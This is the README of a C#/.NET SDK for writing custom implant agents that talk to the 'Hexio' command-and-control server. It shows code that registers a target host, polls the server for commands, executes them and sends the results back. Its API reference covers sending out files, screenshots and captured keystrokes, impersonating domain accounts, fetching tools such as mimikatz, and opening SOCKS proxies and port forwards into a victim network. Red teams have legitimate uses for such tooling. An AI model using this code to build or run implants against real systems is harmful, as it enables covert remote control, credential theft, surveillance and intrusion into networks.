# Hexio External Agent SDK for C# / .NET

A .NET client for the Hexio External Agent REST API. Targets `netstandard2.0`, `net6.0`, and `net8.0` — works on Windows, Linux, macOS, and mobile via .NET / Mono / .NET Framework 4.6.1+.

## Installation

### Option 1: Add the project as a reference

```bash
dotnet add reference ../ExternalAgentSDK/csharp/HexioSdk.csproj
```

### Option 2: Copy the files

Drop `HexioClient.cs` into your project. No NuGet references needed for `net6.0+`; on `netstandard2.0` also install `System.Text.Json`.

### Option 3: Build a NuGet package

```bash
cd ExternalAgentSDK/csharp
dotnet pack -c Release
dotnet add ../../MyAgent/MyAgent.csproj package Hexio.ExternalAgentSdk --source ./bin/Release
```

## Quick Start

```csharp
using Hexio;

using var client = new HexioClient("http://10.0.0.1:9000", "my-passphrase");

var reg = client.Register(new RegisterRequest
{
    Hostname = "TARGET-PC",
    Ip = "10.0.0.50",
    User = "admin",
    Os = "Windows 10",
    Process = "agent.exe",
    Pid = 4832,
    ClientType = "my_dotnet_agent",
    SleepTime = 5,
});
Console.WriteLine($"Registered as agent {reg.AgentId}");

while (true)
{
    var checkin = client.Checkin();
    foreach (var cmd in checkin.Commands)
    {
        var output = ExecuteLocally(cmd.Text);
        client.CommandResponse(cmd.Id, cmd.Text, output);
    }
    Thread.Sleep(5000);
}
```

## API Reference

### Client Creation

```csharp
using var client = new HexioClient(baseUrl, passphrase);

// Or bring your own HttpClient (for custom handlers, proxies, TLS, etc.)
using var client = new HexioClient(baseUrl, passphrase, myHttpClient);
```

### Registration

```csharp
var reg = client.Register(new RegisterRequest { ... });
// reg.AgentId, reg.Token
// client.Token set automatically
```

Async variant:

```csharp
var reg = await client.RegisterAsync(new RegisterRequest { ... });
```

### Checkin / Sync

```csharp
var checkin = client.Checkin();
foreach (var cmd in checkin.Commands) { /* cmd.Id, cmd.Text */ }

var sync = client.Sync(sleepTime: 10, sleepJitter: 3);
var sync = client.Sync();  // no sleep update

// Raw sync with arbitrary fields (batched)
var sync = client.SyncRaw(new
{
    commands = new[] { new { command_id = 42, command = "whoami", response = "..." } },
    screenshots = new[] { new { filename = "s.png", data = "<b64>" } },
});
```

### Command Response

```csharp
client.CommandResponse(42, "whoami", "nt authority\\system");
```

### File Downloads

```csharp
var init = client.DownloadInit(new DownloadInitRequest { ... });
client.DownloadChunk(init.DownloadId, chunkBytes);
client.DownloadCancel(init.DownloadId);

// Or one-shot:
var id = client.DownloadFile("/tmp/data.db", fileBytes, chunkSize: 65536);
```

### Screenshots & Keylogs

```csharp
client.Screenshot("screen.png", imageBytes);
client.Keylog("keys.txt", "captured keystrokes");
```

### Impersonation

```csharp
client.SetImpersonation("DOMAIN\\Admin");
client.ClearImpersonation();
```

### Side Channels

```csharp
client.Sidechannel("shell-1", "<base64-output>");
```

### File Requests

```csharp
var resp = client.RequestFiles(new FileRequest
{
    BofFiles = new() { "whoami.o" },
    PeFiles = new() { "mimikatz.exe" },
});
```

### SOCKS Proxy

```csharp
var resp = client.SocksOpen();          // auto-assign port
var resp = client.SocksOpen(port: 1080);
client.SocksClose();
var data = client.SocksSync(payload);
```

### Port Forwarding

```csharp
client.PortFwdOpen(8080, "10.0.0.5", 3389);
client.PortFwdClose(8080);
var data = client.PortFwdSync(payload);
```

## Error Handling

All non-2xx responses throw `HexioApiException`:

```csharp
try
{
    client.Register(req);
}
catch (HexioApiException e)
{
    Console.Error.WriteLine($"API {e.StatusCode}: {e.Message}");
}
```

## HTTPS

`HttpClient` supports TLS natively. `https://` URLs work with no extra setup.
